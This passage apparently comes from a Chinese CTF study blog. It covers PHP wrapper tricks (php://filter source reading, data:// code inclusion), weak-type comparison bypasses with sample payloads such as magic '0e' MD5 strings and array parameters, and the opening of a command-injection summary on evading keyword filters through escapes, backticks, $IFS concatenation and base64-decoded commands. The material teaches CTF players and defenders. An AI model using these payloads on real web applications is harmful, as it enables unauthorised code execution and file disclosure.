class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$tmp</span>)-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;chr(&quot;</span>.ord(<span class="hljs-variable">$tmp</span>[<span class="hljs-variable">$i</span>]).<span class="hljs-string">&quot;).&quot;</span>;<br>    <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;chr(&quot;</span>.ord(<span class="hljs-variable">$tmp</span>[<span class="hljs-variable">$i</span>]).<span class="hljs-string">&quot;)&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>php中的<a href="https://www.php.net/manual/zh/wrappers.data.php">data</a>协议</p><p>php中的读取源码filter</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">php:<span class="hljs-comment">//filter用于读取源码</span><br>php:<span class="hljs-comment">//input用于执行php代码</span><br><span class="hljs-comment">//例子如下</span><br><span class="hljs-comment">//1.利用data伪协议</span><br><span class="hljs-variable">$data</span>=<span class="hljs-string">&quot;data://text/plain;base64,&quot;</span>.base64_encode(<span class="hljs-string">&quot;内容&quot;</span>);<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$data</span>);<br><span class="hljs-comment">//2.利用filter读取源码</span><br><span class="hljs-variable">$data2</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=&quot;</span>.<span class="hljs-string">&quot;具体文件&quot;</span>;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$data2</span>);<br><span class="hljs-comment">// 3.利用include和data执行命令</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$data3</span>);<br>?data3=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><br></code></pre></div></td></tr></table></figure><h2 id="PHP-弱类型"><a href="#PHP-弱类型" class="headerlink" title="PHP 弱类型"></a>PHP 弱类型</h2><p>最近CTF比赛，不止一次的出了php弱类型的题目，借此想总结一下关于php弱类型以及绕过方式</p><h3 id="0x02-知识介绍"><a href="#0x02-知识介绍" class="headerlink" title="0x02 知识介绍"></a>0x02 知识介绍</h3><p>php中有两种比较的符号 == 与 ===</p><p>构造<code>trick1=NAN</code>，<code>trick2=NAN</code>即可绕过。原理也很简单，NaN与所有值都不相等，包括它自己</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>&lt;?php<br><span class="hljs-symbol">2 </span>$a = $b ;<br><span class="hljs-symbol">3 </span>$a===$b ;<br><span class="hljs-symbol">4 </span>?&gt;<br></code></pre></div></td></tr></table></figure><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p><p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行<br></code></pre></div></td></tr></table></figure><p><strong>这里明确了说如果一个数值和字符串进行比较的时候，会将字符串转换成数值</strong></p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>&lt;?php<br><span class="hljs-symbol">2 </span>var_dump(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  //true<br><span class="hljs-symbol">3 </span>var_dump(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); //true<br><span class="hljs-symbol">4 </span>var_dump(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>) //false<br><span class="hljs-symbol">5 </span>var_dump(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>) //true<br><span class="hljs-symbol">6 </span>var_dump(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); //true <br><span class="hljs-symbol">7 </span>?&gt;  //上述代码可自行测试<br></code></pre></div></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>观察上述代码，<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span> 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是<span class="hljs-number">0</span>自然和<span class="hljs-number">0</span>相等<br><span class="hljs-symbol">2 </span><span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span> 比较的时候会将<span class="hljs-number">1</span>admin转化成数值,结果为<span class="hljs-number">1</span>，而“admin1“==<span class="hljs-number">1</span> 却等于错误，也就是<span class="hljs-string">&quot;admin1&quot;</span>被转化成了<span class="hljs-number">0</span>,为什么呢？？<br><span class="hljs-symbol">3 </span><span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e456789&quot;</span>相互比较的时候，会将<span class="hljs-number">0</span>e这类字符串识别为科学技术法的数字，<span class="hljs-number">0</span>的无论多少次方都是零，所以相等<br></code></pre></div></td></tr></table></figure><p>对于上述的问题我查了php手册</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>并且其数值值在整形的范围之内<br>该字符串被当作<span class="hljs-keyword">int</span>来取值，其他所有情况下都被作为<span class="hljs-keyword">float</span>来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为<span class="hljs-number">0</span>。<br></code></pre></div></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>&lt;?php<br><span class="hljs-symbol">2 </span>$test=<span class="hljs-number">1</span> + <span class="hljs-string">&quot;10.5&quot;</span>; // $test=<span class="hljs-number">11.5</span>(float)<br><span class="hljs-symbol">3 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;-1.3e3&quot;</span>; //$test=-<span class="hljs-number">1299</span>(float)<br><span class="hljs-symbol">4 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;bob-1.3e3&quot;</span>;//$test=<span class="hljs-number">1</span>(<span class="hljs-keyword">int</span>)<br><span class="hljs-symbol">5 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;2admin&quot;</span>;//$test=<span class="hljs-number">3</span>(<span class="hljs-keyword">int</span>)<br><span class="hljs-symbol">6 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;admin2&quot;</span>;//$test=<span class="hljs-number">1</span>(<span class="hljs-keyword">int</span>)<br><span class="hljs-symbol">7 </span>?&gt;<br></code></pre></div></td></tr></table></figure><p>所以就解释了”admin1”==1 =&gt;False 的原因</p><h3 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h3><h4 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-number">1</span> <span class="hljs-meta">&lt;?php</span><br> <span class="hljs-number">2</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br> <span class="hljs-number">3</span>     <span class="hljs-variable">$logined</span> = <span class="hljs-literal">true</span>;<br> <span class="hljs-number">4</span>     <span class="hljs-variable">$Username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Username&#x27;</span>];<br> <span class="hljs-number">5</span>     <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br> <span class="hljs-number">6</span> <br> <span class="hljs-number">7</span>      <span class="hljs-keyword">if</span> (!ctype_alpha(<span class="hljs-variable">$Username</span>)) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br> <span class="hljs-number">8</span>      <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$password</span>) ) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br> <span class="hljs-number">9</span>      <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$Username</span>) != md5(<span class="hljs-variable">$password</span>)) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br><span class="hljs-number">10</span>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$logined</span>)&#123;<br><span class="hljs-number">11</span>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;successful&quot;</span>;<br><span class="hljs-number">12</span>       &#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-number">13</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login failed!&quot;</span>;<br><span class="hljs-number">14</span>         &#125;<br><span class="hljs-number">15</span>     &#125;<br><span class="hljs-number">16</span> <span class="hljs-meta">?&gt;</span>    <br></code></pre></div></td></tr></table></figure><p>题目大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句 </p><p>介绍一批md5开头是0e的字符串 上文提到过，<strong>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</strong>。**md5(‘240610708’) == md5(‘QNKCDZO’)**成功绕过!</p><figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns">QNKCDZO<br><span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br>  <br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br>  <br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br>  <br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br>  <br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br>  <br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br>  <br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br></code></pre></div></td></tr></table></figure><h4 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$message</span> = json_decode(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br>    <span class="hljs-variable">$key</span> =<span class="hljs-string">&quot;*********&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$message</span>-&gt;key == <span class="hljs-variable">$key</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>    &#125;<br> &#125;<br> <span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;~~~~&quot;</span>;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，<strong>但是可以利用0==”admin”这种形式绕过</strong></p><p><strong>最终payload message={“key”:0}</strong></p><h4 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search is_array绕过"></a>array_search is_array绕过</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"> <span class="hljs-number">1</span> &lt;?php<br> <span class="hljs-number">2</span> <span class="hljs-keyword">if</span>(!is_array(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]))&#123;<span class="hljs-keyword">exit</span>();&#125;<br> <span class="hljs-number">3</span> <span class="hljs-variable">$test</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br> <span class="hljs-number">4</span> <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$test</span>);<span class="hljs-variable">$i</span>++)&#123;<br> <span class="hljs-number">5</span>     <span class="hljs-keyword">if</span>(<span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br> <span class="hljs-number">6</span>         echo <span class="hljs-string">&quot;error&quot;</span>;<br> <span class="hljs-number">7</span>         <span class="hljs-keyword">exit</span>();<br> <span class="hljs-number">8</span>     &#125;<br> <span class="hljs-number">9</span>     <span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]=intval(<span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]);<br><span class="hljs-number">10</span> &#125;<br><span class="hljs-number">11</span> <span class="hljs-keyword">if</span>(array_search(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-variable">$test</span>)===<span class="hljs-number">0</span>)&#123;<br><span class="hljs-number">12</span>     echo <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-number">13</span> &#125;<br><span class="hljs-number">14</span> <span class="hljs-keyword">else</span>&#123;<br><span class="hljs-number">15</span>     echo <span class="hljs-string">&quot;false&quot;</span>;<br><span class="hljs-number">16</span> &#125;<br><span class="hljs-number">17</span> ?&gt;<br></code></pre></div></td></tr></table></figure><p>上面是自己写的一个，先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag</p><p>payload test[]=0可以绕过</p><p>下面是官方手册对array_search的介绍</p><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">mixed array_search ( mixed $needle ,<span class="hljs-built_in"> array </span>$haystack [, bool $strict = false ] )<br></code></pre></div></td></tr></table></figure><p>$needle，$haystack必需，$strict可选 函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>&lt;?php<br><span class="hljs-symbol">2 </span>$a=array(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br><span class="hljs-symbol">3 </span>var_dump(array_search(<span class="hljs-string">&quot;admin&quot;</span>,$a)); // <span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>) =&gt; 返回键值<span class="hljs-number">0</span><br><span class="hljs-symbol">4 </span>var_dump(array_seach(<span class="hljs-string">&quot;1admin&quot;</span>,$a));  // <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>) ==&gt;返回键值<span class="hljs-number">1</span><br><span class="hljs-symbol">5 </span>?&gt;<br></code></pre></div></td></tr></table></figure><p>array_search函数 类似于== 也就是$a==”admin” 当然是$a=0 当然如果第三个参数为true则就不能绕过</p><h4 id="strcmp漏洞绕过-php-v-lt-5-3"><a href="#strcmp漏洞绕过-php-v-lt-5-3" class="headerlink" title="strcmp漏洞绕过 php -v &lt;5.3"></a>strcmp漏洞绕过 php -v &lt;5.3</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-number">1</span> <span class="hljs-meta">&lt;?php</span><br> <span class="hljs-number">2</span>     <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;***************&quot;</span><br> <span class="hljs-number">3</span>      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br> <span class="hljs-number">4</span> <br> <span class="hljs-number">5</span>         <span class="hljs-keyword">if</span> (strcmp(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$password</span>) == <span class="hljs-number">0</span>) &#123;<br> <span class="hljs-number">6</span>             <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Right!!!login success&quot;</span>;n<br> <span class="hljs-number">7</span>             <span class="hljs-keyword">exit</span>();<br> <span class="hljs-number">8</span>         &#125; <span class="hljs-keyword">else</span> &#123;<br> <span class="hljs-number">9</span>             <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Wrong password..&quot;</span>;<br><span class="hljs-number">10</span>         &#125;<br><span class="hljs-number">11</span> <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 如果str1大于str2返回&gt;0 如果两者相等 返回0</p><p>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</p><p>我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</p><p>payload: password[]=xxx</p><h4 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-number">1</span> <span class="hljs-meta">&lt;?php</span><br> <span class="hljs-number">2</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;4admin&quot;</span>;<br> <span class="hljs-number">3</span> <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$a</span>) &#123;<br> <span class="hljs-number">4</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br> <span class="hljs-number">5</span>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail1&quot;</span>;<br> <span class="hljs-number">6</span>         <span class="hljs-keyword">break</span>;<br> <span class="hljs-number">7</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br> <span class="hljs-number">8</span>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail2&quot;</span>;<br> <span class="hljs-number">9</span>         <span class="hljs-keyword">break</span>;<br><span class="hljs-number">10</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br><span class="hljs-number">11</span>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail3&quot;</span>;<br><span class="hljs-number">12</span>         <span class="hljs-keyword">break</span>;<br><span class="hljs-number">13</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br><span class="hljs-number">14</span>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sucess&quot;</span>;  <span class="hljs-comment">//结果输出success;</span><br><span class="hljs-number">15</span>         <span class="hljs-keyword">break</span>;<br><span class="hljs-number">16</span>     <span class="hljs-keyword">default</span>:<br><span class="hljs-number">17</span>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;failall&quot;</span>;<br><span class="hljs-number">18</span>         <span class="hljs-keyword">break</span>;<br><span class="hljs-number">19</span> &#125;<br><span class="hljs-number">20</span> <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>这种原理和前面的类似，就不详细解释了</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>这些php弱类型只是冰山一角 上述验证了代码审计的重要性</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF 相关知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-RCE 总结</title>
    <link href="/2021/04/17/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/CTF-RCE%20%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/17/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/CTF-RCE%20%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-RCE总结"><a href="#CTF-RCE总结" class="headerlink" title="CTF-RCE总结"></a>CTF-RCE总结</h1><h2 id="1-命令执行"><a href="#1-命令执行" class="headerlink" title="1. 命令执行"></a>1. 命令执行</h2><h3 id="1-1-过滤cat，flag等关键词"><a href="#1-1-过滤cat，flag等关键词" class="headerlink" title="1.1 过滤cat，flag等关键词"></a>1.1 过滤cat，flag等关键词</h3><h4 id="1-1-1-代替"><a href="#1-1-1-代替" class="headerlink" title="1.1.1 代替"></a>1.1.1 代替</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>sh /flag 2&gt;%261  //报错出文件内容<br></code></pre></div></td></tr></table></figure><h4 id="1-1-2-使用转义符"><a href="#1-1-2-使用转义符" class="headerlink" title="1.1.2 使用转义符"></a>1.1.2 使用转义符</h4><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">ca\t /fl\ag<br>cat fl&#x27;&#x27;ag<br></code></pre></div></td></tr></table></figure><h4 id="1-1-3-内联执行绕过"><a href="#1-1-3-内联执行绕过" class="headerlink" title="1.1.3 内联执行绕过"></a>1.1.3 内联执行绕过</h4><p>内联获取</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 通过内联获取<br>cat `ls` # 等同于读取ls的所有内容<br><span class="hljs-built_in">echo</span> `ls`;<br><span class="hljs-built_in">echo</span> $(ls);<br>?&gt;&lt;?=`ls`;<br>?&gt;&lt;?=$(ls);<br></code></pre></div></td></tr></table></figure><h4 id="1-1-4-变量绕过"><a href="#1-1-4-变量绕过" class="headerlink" title="1.1.4 变量绕过"></a>1.1.4 变量绕过</h4><p>拼接</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 通过拼接获取 同样可以拼接cat<br>a=fl;b=ag.php;cat$IFS$a$b<br></code></pre></div></td></tr></table></figure><h4 id="1-1-5-编码进制绕过"><a href="#1-1-5-编码进制绕过" class="headerlink" title="1.1.5 编码进制绕过"></a>1.1.5 编码进制绕过</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;cat&#x27;</span> | base64<br>Y2F0wqAK<br><span class="hljs-comment"># 通过base64编码输出</span><br>`<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Y2F0wqAK&#x27;</span> | base64 -d` 1.txt<br><span class="hljs-comment"># 输出1.txt内容</span><br></code></pre></div></td></tr></table></figure><p>16进制：</p><p><img src="https://img-blog.csdnimg.cn/2020081922334328.png#pic_center"></p><p><img src="https://img-blog.csdnimg.cn/20200819223413305.png#pic_center"></p><p>8进制</p><p><img src="https://img-blog.csdnimg.cn/20200819223432773.png#pic_center"></p><h4 id="1-1-6-过滤文件名绕过（例如过滤-etc-passwd文件）"><a href="#1-1-6-过滤文件名绕过（例如过滤-etc-passwd文件）" class="headerlink" title="1.1.6 过滤文件名绕过（例如过滤/etc/passwd文件）"></a>1.1.6 过滤文件名绕过（例如过滤/etc/passwd文件）</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span 